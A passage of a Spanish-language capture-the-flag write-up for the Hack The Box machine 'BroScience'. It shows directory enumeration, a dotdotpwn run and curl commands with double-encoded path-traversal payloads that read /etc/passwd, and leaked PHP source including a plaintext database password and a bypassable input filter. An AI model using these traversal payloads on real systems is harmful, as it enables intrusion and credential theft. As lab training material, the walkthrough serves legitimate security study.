🎉 New Version Available │ https://github.com/epi052/feroxbuster/releases/latest ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Cancel Menu™ ────────────────────────────────────────────────── 301 9l 28w 319c https://broscience.htb/images 200 147l 510w 0c https://broscience.htb/index.php 200 42l 97w 1936c https://broscience.htb/login.php 200 45l 104w 2161c https://broscience.htb/register.php 200 29l 70w 1309c https://broscience.htb/user.php 302 1l 3w 13c https://broscience.htb/comment.php 301 9l 28w 321c https://broscience.htb/includes 200 1l 4w 39c https://broscience.htb/includes/img.php 301 9l 28w 319c https://broscience.htb/manual 301 9l 28w 326c https://broscience.htb/manual/images 301 9l 28w 322c https://broscience.htb/manual/en 200 5l 14w 369c https://broscience.htb/includes/header.php 301 9l 28w 322c https://broscience.htb/manual/de 301 9l 28w 322c https://broscience.htb/manual/fr 301 9l 28w 322c https://broscience.htb/manual/es 301 9l 28w 323c https://broscience.htb/javascript 302 0l 0w 0c https://broscience.htb/logout.php 301 9l 28w 322c https://broscience.htb/manual/tr El \u0026lsquo;directorio\u0026rsquo; /includes muestra multiples paginas .php, entre ellas img.php.\nWeb App Al visitar cada una de las paginas encontramos que img.php espera el parametro path tal y como lo observamos anteriormente.\nLa respuesta del servidor parece intentar retornar una imagen.\n1 2 3 4 5 6 7 π ~/htb/broscience ❯ curl -skI \u0026#34;https://broscience.htb/includes/img.php?path=something\u0026#34; HTTP/1.1 200 OK Date: Mon, 06 Mar 2023 23:16:13 GMT Server: Apache/2.4.54 (Debian) Content-Type: image/png π ~/htb/broscience ❯ Directory Traversal Al intentar pasarle la direccion de un archivo completo nos muestra un mensaje.\n1 2 3 π ~/htb/broscience ❯ curl -sk \u0026#34;https://broscience.htb/includes/img.php?path=../../../../../etc/passwd\u0026#34; \u0026lt;b\u0026gt;Error:\u0026lt;/b\u0026gt; Attack detected. π ~/htb/broscience ❯ Utilizamos [dotdotpwn][https://github.com/wireghoul/dotdotpwn] que nos permite crear multiples \u0026lsquo;payloads\u0026rsquo; para realizar directory traversal. Observamos que encontro un payload funcional para el archivo /etc/passwd.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 ┌─[kirby@parrot]─[~/htb/broscience/dotdotpwn] └──╼ $./dotdotpwn.pl -m http-url -u https://broscience.htb/includes/img.php?path=TRAVERSAL -k \u0026#34;root:\u0026#34; -t .2 -q [.. snip ..] [========== TARGET INFORMATION ==========] [+] Hostname: broscience.htb [+] Protocol: https [+] Port: 443 [=========== TRAVERSAL ENGINE ===========] [+] Creating Traversal patterns (mix of dots and slashes) [+] Multiplying 6 times the traversal patterns (-d switch) [+] Creating the Special Traversal patterns [+] Translating (back)slashes in the filenames [+] Adapting the filenames according to the OS type detected (unix) [+] Including Special sufixes [+] Traversal Engine DONE ! - Total traversal tests created: 11052 [=========== TESTING RESULTS ============] [+] Ready to launch 5000.00 traversals per second [+] Press Enter to start the testing (You can stop it pressing Ctrl + C) [+] Replacing \u0026#34;TRAVERSAL\u0026#34; with the traversals created and sending . . . . . . . . [*] Testing URL: https://broscience.htb/includes/img.php?path=..%252f..%252f..%252f..%252fetc%252fpasswd \u0026lt;- VULNERABLE [*] Testing URL: https://broscience.htb/includes/img.php?path=..%252f..%252f..%252f..%252f..%252fetc%252fpasswd \u0026lt;- VULNERABLE [*] Testing URL: https://broscience.htb/includes/img.php?path=..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd \u0026lt;- VULNERABLE . . . . . . . . . . ^C [+] Total Traversals found: 3 [.. snip ..] Observamos que retorna el contenido del archivo, en el archivo /etc/passwd encontramos al usuario bill.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 π ~/htb/broscience ❯ curl -sk \u0026#34;https://broscience.htb/includes/img.php?path=..%252f..%252f..%252f..%252fetc%252fpasswd\u0026#34; | head root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin π ~/htb/broscience ❯ π ~/htb/broscience ❯ curl -sk \u0026#34;https://broscience.htb/includes/img.php?path=..%252f..%252f..%252f..%252fetc%252fpasswd\u0026#34; |grep home bill:x:1000:1000:bill,,,:/home/bill:/bin/bash π ~/htb/broscience ❯ Reading Local Files Con ello logramos obtener el codigo fuente de los archivos php dentro del directorio /includes y en el directorio \u0026lsquo;principal\u0026rsquo;. Observamos que existe un \u0026lsquo;filtro\u0026rsquo; en el parametro path para los caracteres ../ y otras dos strings.\nimg.php\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 //img.php \u0026lt;?php if (!isset($_GET[\u0026#39;path\u0026#39;])) { die(\u0026#39;\u0026lt;b\u0026gt;Error:\u0026lt;/b\u0026gt; Missing \\\u0026#39;path\\\u0026#39; parameter.\u0026#39;); } // Check for LFI attacks $path = $_GET[\u0026#39;path\u0026#39;]; $badwords = array(\u0026#34;../\u0026#34;, \u0026#34;etc/passwd\u0026#34;, \u0026#34;.ssh\u0026#34;); foreach ($badwords as $badword) { if (strpos($path, $badword) !== false) { die(\u0026#39;\u0026lt;b\u0026gt;Error:\u0026lt;/b\u0026gt; Attack detected.\u0026#39;); } } // Normalize path $path = urldecode($path); // Return the image header(\u0026#39;Content-Type: image/png\u0026#39;); echo file_get_contents(\u0026#39;/var/www/html/images/\u0026#39; . $path); ?\u0026gt; Encontramos credenciales en la conexion de la base de datos.\ndb_connect.php\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 //db_connect.php \u0026lt;?php $db_host = \u0026#34;localhost\u0026#34;; $db_port = \u0026#34;5432\u0026#34;; $db_name = \u0026#34;broscience\u0026#34;; $db_user = \u0026#34;dbuser\u0026#34;; $db_pass = \u0026#34;RangeOfMotion%777\u0026#34;; $db_salt = \u0026#34;NaCl\u0026#34;; $db_conn = pg_connect(\u0026#34;host={$db_host} port={$db_port} dbname={$db_name} user={$db_user} password={$db_pass}\u0026#34;); if (!$db_conn) { die(\u0026#34;\u0026lt;b\u0026gt;Error\u0026lt;/b\u0026gt;: Unable to connect to database\u0026#34;); } ?\u0026gt; En el archivo navbar observamos que obtiene el nombre de la clase del tema (linea 6) y muestra el nombre de usuario, si esta o no logeado.\nnavbar.php\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 //navbar.php \u0026lt;?php include_once \u0026#34;includes/utils.php\u0026#34;; ?\u0026gt; \u0026lt;nav class=\u0026#34;uk-navbar-container uk-margin uk-navbar-transparent \u0026lt;?=get_theme_class()?\u0026gt;\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;uk-container uk-container-expand\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;uk-navbar\u0026#34; uk-navbar\u0026gt; \u0026lt;div class=\u0026#34;uk-navbar-left\u0026#34;\u0026gt; \u0026lt;a href=\u0026#34;/\u0026#34; class=\u0026#34;uk-navbar-item uk-logo\u0026#34;\u0026gt;BroScience\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;uk-navbar-right\u0026#34;\u0026gt; \u0026lt;?php // Check if user is logged in if (isset($_SESSION[\u0026#39;id\u0026#39;])) { echo \u0026#39;\u0026lt;div class=\u0026#34;uk-navbar-item\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;swap_theme.php\u0026#34; class=\u0026#34;uk-link-text\u0026#34;\u0026gt;\u0026lt;span uk-icon=\u0026#34;icon: paint-bucket\u0026#34;\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/a\u0026gt;\u0026lt;/div\u0026gt;\u0026#39;; echo \u0026#34;\u0026lt;div class=\\\u0026#34;uk-navbar-item\\\u0026#34;\u0026gt;Logged in as \u0026lt;a class=\\\u0026#34;uk-link-text\\\u0026#34; href=\\\u0026#34;user.php?id={$_SESSION[\u0026#39;id\u0026#39;]}\\\u0026#34;\u0026gt;\u0026lt;b\u0026gt;\u0026#34;.htmlspecialchars($_SESSION[\u0026#39;username\u0026#39;],ENT_QUOTES,\u0026#39;UTF-8\u0026#39;).\u0026#34;\u0026lt;/b\u0026gt;\u0026lt;/a\u0026gt;\u0026lt;/div\u0026gt;\u0026#34;; echo \u0026#39;\u0026lt;ul class=\u0026#34;uk-navbar-nav\u0026#34;\u0026gt;\u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;logout.php\u0026#34;\u0026gt;Log Out\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt;\u0026lt;/ul\u0026gt;\u0026#39;; } else { echo \u0026#39;\u0026lt;ul class=\u0026#34;uk-navbar-nav\u0026#34;\u0026gt;\u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;login.php\u0026#34;\u0026gt;Log In\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt;\u0026lt;/ul\u0026gt;\u0026#39;; } ?\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/nav\u0026gt; User, muestra la informacion de cada usuario segun el valor del parametro id.\nuser.php\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 //user.php \u0026lt;?php session_start(); // Is it a proper request? if (isset($_GET[\u0026#39;id\u0026#39;])) { if (!empty($_GET[\u0026#39;id\u0026#39;])) { if (filter_var($_GET[\u0026#39;id\u0026#39;], FILTER_VALIDATE_INT)) { include_once \u0026#39;includes/db_connect.php\u0026#39;; $res = pg_prepare($db_conn, \u0026#34;get_user_query\u0026#34;, \u0026#39;SELECT username, email, is_activated::int, is_admin::int, date_created FROM users WHERE id = $1\u0026#39;); $res = pg_execute($db_conn, \u0026#34;get_user_query\u0026#34;, array($_GET[\u0026#39;id\u0026#39;])); if (pg_num_rows($res) \u0026gt; 0) { $row = pg_fetch_row($res); } else { $alert = \u0026#34;No user with that ID\u0026#34;; } } else { $alert = \u0026#34;Invalid ID value\u0026#34;; } } else { $alert = \u0026#34;Empty ID value\u0026#34;; } } else { $alert = \u0026#34;Missing ID value\u0026#34;; } ?\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;BroScience : \u0026lt;?php if (isset($row)) {echo htmlspecialchars($row[0],ENT_QUOTES,\u0026#39;UTF-8\u0026#39;);} else {echo \u0026#34;View user\u0026#34;;}?\u0026gt;\u0026lt;/title\u0026gt; \u0026lt;?php include_once \u0026#39;includes/header.php\u0026#39;; include_once \u0026#39;includes/utils.php\u0026#39;; $theme = get_theme(); ?\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;styles/\u0026lt;?=$theme?\u0026gt;.css\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body class=\u0026#34;\u0026lt;?=get_theme_class($theme)?\u0026gt;\u0026#34;\u0026gt; \u0026lt;?php include_once \u0026#39;includes/navbar.php\u0026#39;; ?\u0026gt; \u0026lt;div class=\u0026#34;uk-container uk-container-xsmall\u0026#34;\u0026gt; \u0026lt;?php // Display any alerts if (isset($alert)) { ?\u0026gt; \u0026lt;div uk-alert class=\u0026#34;uk-alert-\u0026lt;?php if(isset($alert_type)){echo $alert_type;}else{echo \u0026#39;danger\u0026#39;;} ?\u0026gt;\u0026#34;\u0026gt; \u0026lt;a class=\u0026#34;uk-alert-close\u0026#34; uk-close\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;?=$alert?\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;?php } if (isset($row)) { ?\u0026gt; \u0026lt;h1 class=\u0026#34;uk-heading-small\u0026#34;\u0026gt;\u0026lt;?=htmlspecialchars($row[0],ENT_QUOTES,\u0026#39;UTF-8\u0026#39;)?\u0026gt;\u0026lt;/h1\u0026gt; \u0026lt;!-- TODO: Avatars --\u0026gt; \u0026lt;dl class=\u0026#34;uk-description-list\u0026#34;\u0026gt; \u0026lt;dt\u0026gt;Member since\u0026lt;/dt\u0026gt; \u0026lt;dd\u0026gt;\u0026lt;?=rel_time($row[4])?\u0026gt;\u0026lt;/dd\u0026gt; \u0026lt;dt\u0026gt;Email Address\u0026lt;/dt\u0026gt; \u0026lt;dd\u0026gt;\u0026lt;?=$row[1]?\u0026gt;\u0026lt;/dd\u0026gt; \u0026lt;dt\u0026gt;Total exercises posted\u0026lt;/dt\u0026gt; \u0026lt;dd\u0026gt; \u0026lt;?php $res = pg_prepare($db_conn, \u0026#34;get_num_exercises_query\u0026#34;, \u0026#39;SELECT COUNT(*) FROM exercises WHERE author_id = $1\u0026#39;); $res = pg_execute($db_conn, \u0026#34;get_num_exercises_query\u0026#34;, array($_GET[\u0026#39;id\u0026#39;])); $row2 = pg_fetch_row($res); echo $row2[0]; ?\u0026gt; \u0026lt;/dd\u0026gt; \u0026lt;dt\u0026gt;Total comments posted\u0026lt;/dt\u0026gt; \u0026lt;dd\u0026gt; \u0026lt;?php $res = pg_prepare($db_conn, \u0026#34;get_num_comments_query\u0026#34;, \u0026#39;SELECT COUNT(*) FROM comments WHERE author_id = $1\u0026#39;); $res = pg_execute($db_conn, \u0026#34;get_num_comments_query\u0026#34;, array($_GET[\u0026#39;id\u0026#39;])); $row3 = pg_fetch_row($res); echo $row3[0]; ?\u0026gt; \u0026lt;/dd\u0026gt; \u0026lt;dt\u0026gt;Is activated\u0026lt;/dt\u0026gt; \u0026lt;dd\u0026gt; \u0026lt;?=(bool)$row[2]?\u0026#39;Yes\u0026#39;:\u0026#39;No\u0026#39;?\u0026gt; \u0026lt;/dd\u0026gt; \u0026lt;dt\u0026gt;Is admin\u0026lt;/dt\u0026gt; \u0026lt;dd\u0026gt; \u0026lt;?=(bool)$row[3]?\u0026#39;Yes\u0026#39;:\u0026#39;No\u0026#39;?\u0026gt; \u0026lt;/dd\u0026gt; \u0026lt;/dl\u0026gt; \u0026lt;?php // Check if we are logged in if (isset($_SESSION[\u0026#39;id\u0026#39;])) { if ($_SESSION[\u0026#39;id\u0026#39;] === $_GET[\u0026#39;id\u0026#39;] || $_SESSION[\u0026#39;is_admin\u0026#39;]) { // We are logged in as this user, add the edit form ?\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;form class=\u0026#34;uk-form-stacked\u0026#34; method=\u0026#34;POST\u0026#34; action=\u0026#34;update_user.php\u0026#34;\u0026gt; \u0026lt;fieldset class=\u0026#34;uk-fieldset\u0026#34;\u0026gt; \u0026lt;legend class=\u0026#34;uk-legend\u0026#34;\u0026gt;Edit User\u0026lt;/legend\u0026gt; \u0026lt;div class=\u0026#34;uk-margin\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;username\u0026#34; class=\u0026#34;uk-input\u0026#34; type=\u0026#34;text\u0026#34; placeholder=\u0026#34;New username\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;uk-margin\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;email\u0026#34; class=\u0026#34;uk-input\u0026#34; type=\u0026#34;email\u0026#34; placeholder=\u0026#34;New email\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;uk-margin\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;password\u0026#34; class=\u0026#34;uk-input\u0026#34; placeholder=\u0026#34;New password\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;uk-margin\u0026#34;\u0026gt; \u0026lt;button class=\u0026#34;uk-button uk-button-default\u0026#34; type=\u0026#34;submit\u0026#34;\u0026gt;Update\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;id\u0026#34; value=\u0026#34;\u0026lt;?=$_GET[\u0026#39;id\u0026#39;]?\u0026gt;\u0026#34;\u0026gt; \u0026lt;/fieldset\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;?php } } } ?\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Obseravamos la informacion del usuario con id 1 en el navegador.\nVemos en comment que, agrega un nuevo comentario a un post, verificando primero que el usuario este logeado.\ncomment.php\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 //comment.php \u0026lt;?php session_start(); // Check if user is not logged in if (!isset($_SESSION[\u0026#39;id\u0026#39;])) { header(\u0026#39;Location: /login.php\u0026#39;); echo \u0026#34;Not logged in\u0026#34;; die(); } // Check that all parameters are filled out if (!isset($_POST[\u0026#39;content\u0026#39;]) || !isset($_POST[\u0026#39;exercise_id\u0026#39;])) { header(\u0026#39;Location: /index.php\u0026#39;); echo \u0026#34;Missing parameters\u0026#34;; die(); } // Check that parameters are not empty if (empty($_POST[\u0026#39;content\u0026#39;]) || empty($_POST[\u0026#39;exercise_id\u0026#39;])) { header(\u0026#39;Location: /index.php\u0026#39;); echo \u0026#34;Empty parameters\u0026#34;; die(); } // Add the comment include_once \u0026#39;includes/db_connect.php\u0026#39;; $res = pg_prepare($db_conn, \u0026#34;add_comment_query\u0026#34;, \u0026#39;INSERT INTO comments (exercise_id, author_id, content) VALUES ($1, $2, $3)\u0026#39;); $res = pg_execute($db_conn, \u0026#34;add_comment_query\u0026#34;, array($_POST[\u0026#39;exercise_id\u0026#39;], $_SESSION[\u0026#39;id\u0026#39;], $_POST[\u0026#39;content\u0026#39;])); header(\u0026#34;Location: /exercise.php?id={$_POST[\u0026#39;exercise_id\u0026#39;]}\u0026#34;); echo \u0026#34;Comment posted\u0026#34;; ?\u0026gt; En register observamos las validaciones del registro de un nuevo usuario, destaca la funcion de codigo de activacion (generate_activation_code()) al registrar un nuevo usuario, el cual se activa en la direccion https://broscience.htb/activate.php?code=\u0026lt;codigo\u0026gt;, el codigo de activacion es enviado aparentemente por email pero no se muestra alguna funcionalidad como esta.\nregister.php\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 //register.php \u0026lt;?php session_start(); // Check if user is logged in already if (isset($_SESSION[\u0026#39;id\u0026#39;])) { header(\u0026#39;Location: /index.php\u0026#39;); } // Handle a submitted register form if (isset($_POST[\u0026#39;username\u0026#39;]) \u0026amp;\u0026amp; isset($_POST[\u0026#39;email\u0026#39;]) \u0026amp;\u0026amp; isset($_POST[\u0026#39;password\u0026#39;]) \u0026amp;\u0026amp; isset($_POST[\u0026#39;password-confirm\u0026#39;])) { // Check if variables are empty if (!empty($_POST[\u0026#39;username\u0026#39;]) \u0026amp;\u0026amp; !empty($_POST[\u0026#39;email\u0026#39;]) \u0026amp;\u0026amp; !empty($_POST[\u0026#39;password\u0026#39;]) \u0026amp;\u0026amp; !empty($_POST[\u0026#39;password-confirm\u0026#39;])) { // Check if passwords match if (strcmp($_POST[\u0026#39;password\u0026#39;], $_POST[\u0026#39;password-confirm\u0026#39;]) == 0) { // Check if email is too long if (strlen($_POST[\u0026#39;email\u0026#39;]) \u0026lt;= 100) { // Check if email is valid if (filter_var($_POST[\u0026#39;email\u0026#39;], FILTER_VALIDATE_EMAIL)) { // Check if username is valid if (strlen($_POST[\u0026#39;username\u0026#39;]) \u0026lt;= 100) { // Check if user exists already include_once \u0026#39;includes/db_connect.php\u0026#39;; $res = pg_prepare($db_conn, \u0026#34;check_username_query\u0026#34;, \u0026#39;SELECT id FROM users WHERE username = $1\u0026#39;); $res = pg_execute($db_conn, \u0026#34;check_username_query\u0026#34;, array($_POST[\u0026#39;username\u0026#39;])); if (pg_num_rows($res) == 0) { // Check if email is registered already $res = pg_prepare($db_conn, \u0026#34;check_email_query\u0026#34;, \u0026#39;SELECT id FROM users WHERE email = $1\u0026#39;); $res = pg_execute($db_conn, \u0026#34;check_email_query\u0026#34;, array($_POST[\u0026#39;email\u0026#39;])); if (pg_num_rows($res) == 0) { // Create the account include_once \u0026#39;includes/utils.php\u0026#39;; $activation_code = generate_activation_code(); $res = pg_prepare($db_conn, \u0026#34;check_code_unique_query\u0026#34;, \u0026#39;SELECT id FROM users WHERE activation_code = $1\u0026#39;); $res = pg_execute($db_conn, \u0026#34;check_code_unique_query\u0026#34;, array($activation_code)); if (pg_num_rows($res) == 0) { $res = pg_prepare($db_conn, \u0026#34;create_user_query\u0026#34;, \u0026#39;INSERT INTO users (username, password, email, activation_code) VALUES ($1, $2, $3, $4)\u0026#39;); $res = pg_execute($db_conn, \u0026#34;create_user_query\u0026#34;, array($_POST[\u0026#39;username\u0026#39;], md5($db_salt . $_POST[\u0026#39;password\u0026#39;]), $_POST[\u0026#39;email\u0026#39;], $activation_code)); // TODO: Send the activation link to email $activation_link = \u0026#34;https://broscience.htb/activate.php?code={$activation_code}\u0026#34;; $alert = \u0026#34;Account created. Please check your email for the activation link.\u0026#34;; $alert_type = \u0026#34;success\u0026#34;; } else { $alert = \u0026#34;Failed to generate a valid activation code, please try again.\u0026#34;; } } else { $alert = \u0026#34;An account with this email already exists.\u0026#34;; } } else { $alert = \u0026#34;Username is already taken.\u0026#34;; } } else { $alert = \u0026#34;Maximum username length is 100 characters.\u0026#34;; } } else { $alert = \u0026#34;Please enter a valid email address.\u0026#34;; } } else { $alert = \u0026#34;Maximum email length is 100 characters.\u0026#34;; } } else { $alert = \u0026#34;Passwords do not match.\u0026#34;; } } else { $alert = \u0026#34;Please fill all fields in.\u0026#34;; } } ?\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;BroScience : Register\u0026lt;/title\u0026gt; \u0026lt;?php include_once \u0026#39;includes/header.php\u0026#39;; ?\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;?php include_once \u0026#39;includes/navbar.php\u0026#39;; ?\u0026gt; \u0026lt;div class=\u0026#34;uk-container uk-container-xsmall\u0026#34;\u0026gt; \u0026lt;form class=\u0026#34;uk-form-stacked\u0026#34; method=\u0026#34;POST\u0026#34; action=\u0026#34;register.php\u0026#34;\u0026gt; \u0026lt;fieldset class=\u0026#34;uk-fieldset\u0026#34;\u0026gt; \u0026lt;legend class=\u0026#34;uk-legend\u0026#34;\u0026gt;Register\u0026lt;/legend\u0026gt; \u0026lt;?php // Display any alerts if (isset($alert)) { ?\u0026gt; \u0026lt;div uk-alert class=\u0026#34;uk-alert-\u0026lt;?php if(isset($alert_type)){echo $alert_type;}else{echo \u0026#39;danger\u0026#39;;} ?\u0026gt;\u0026#34;\u0026gt; \u0026lt;a class=\u0026#34;uk-alert-close\u0026#34; uk-close\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;?=$alert?\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;?php } ?\u0026gt; \u0026lt;div class=\u0026#34;uk-margin\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;username\u0026#34; class=\u0026#34;uk-input\u0026#34; placeholder=\u0026#34;Username\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;uk-margin\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;email\u0026#34; class=\u0026#34;uk-input\u0026#34; type=\u0026#34;email\u0026#34; placeholder=\u0026#34;Email\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;uk-margin\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;password\u0026#34; class=\u0026#34;uk-input\u0026#34; type=\u0026#34;password\u0026#34; placeholder=\u0026#34;Password\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;uk-margin\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;password-confirm\u0026#34; class=\u0026#34;uk-input\u0026#34; type=\u0026#34;password\u0026#34; placeholder=\u0026#34;Repeat password\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;uk-margin\u0026#34;\u0026gt; \u0026lt;button class=\u0026#34;uk-button uk-button-default\u0026#34; type=\u0026#34;submit\u0026#34;\u0026gt;Register\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/fieldset\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Como se menciono, no se muestra el codigo de activacion al registrar un nuevo usuario.\nLogin, permite la autenticacion de los usuarios por medio de un formulario.\nlogin.php\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 //login.php \u0026lt;?php session_start(); // Check if user is logged in already if (isset($_SESSION[\u0026#39;id\u0026#39;])) { header(\u0026#39;Location: /index.php\u0026#39;); } // Handle a submitted log in form if (isset($_POST[\u0026#39;username\u0026#39;]) \u0026amp;\u0026amp; isset($_POST[\u0026#39;password\u0026#39;])) { // Check if variables are empty if (!empty($_POST[\u0026#39;username\u0026#39;]) \u0026amp;\u0026amp; !empty($_POST[\u0026#39;password\u0026#39;])) { include_once \u0026#39;includes/db_connect.php\u0026#39;; // Check if username:password is correct $res = pg_prepare($db_conn, \u0026#34;login_query\u0026#34;, \u0026#39;SELECT id, username, is_activated::int, is_admin::int FROM users WHERE username=$1 AND password=$2\u0026#39;); $res = pg_execute($db_conn, \u0026#34;login_query\u0026#34;, array($_POST[\u0026#39;username\u0026#39;], md5($db_salt . $_POST[\u0026#39;password\u0026#39;]))); if (pg_num_rows($res) == 1) { // Check if account is activated $row = pg_fetch_row($res); if ((bool)$row[2]) { // User is logged in $_SESSION[\u0026#39;id\u0026#39;] = $row[0]; $_SESSION[\u0026#39;username\u0026#39;] = $row[1]; $_SESSION[\u0026#39;is_admin\u0026#39;] = $row[3]; // Redirect to home page header(\u0026#39;Location: /index.php\u0026#39;); } else { $alert = \u0026#34;Account is not activated yet\u0026#34;; } } else { $alert = \u0026#34;Username or password is incorrect.\u0026#34;; } } else { $alert = \u0026#34;Please fill in both username and password.\u0026#34;; } } ?\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;BroScience : Log In\u0026lt;/title\u0026gt; \u0026lt;?php include_once \u0026#39;includes/header.php\u0026#39;; ?\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;?php include_once \u0026#39;includes/navbar.php\u0026#39;; ?\u0026gt; \u0026lt;div class=\u0026#34;uk-container uk-container-xsmall\u0026#34;\u0026gt; \u0026lt;form class=\u0026#34;uk-form-stacked\u0026#34; method=\u0026#34;POST\u0026#34; action=\u0026#34;login.php\u0026#34;\u0026gt; \u0026lt;fieldset class=\u0026#34;uk-fieldset\u0026#34;\u0026gt; \u0026lt;legend class=\u0026#34;uk-legend\u0026#34;\u0026gt;Log In\u0026lt;/legend\u0026gt; \u0026lt;?php // Display any alerts if (isset($alert)) { ?\u0026gt; \u0026lt;div uk-alert class=\u0026#34;uk-alert-\u0026lt;?php if(isset($alert_type)){echo $alert_type;}else{echo \u0026#39;danger\u0026#39;;} ?\u0026gt;\u0026#34;\u0026gt; \u0026lt;a class=\u0026#34;uk-alert-close\u0026#34; uk-close\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;?=$alert?\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;?php } ?\u0026gt; \u0026lt;div class=\u0026#34;uk-margin\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;username\u0026#34; class=\u0026#34;uk-input\u0026#34; placeholder=\u0026#34;Username\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;uk-margin\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;password\u0026#34; class=\u0026#34;uk-input\u0026#34; type=\u0026#34;password\u0026#34; placeholder=\u0026#34;Password\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;uk-margin\u0026#34;\u0026gt; \u0026lt;button class=\u0026#34;uk-button uk-button-default\u0026#34; type=\u0026#34;submit\u0026#34;\u0026gt;Log in\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;uk-margin\u0026#34;\u0026gt; \u0026lt;a href=\u0026#34;register.php\u0026#34;\u0026gt;Create an account\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/fieldset\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; 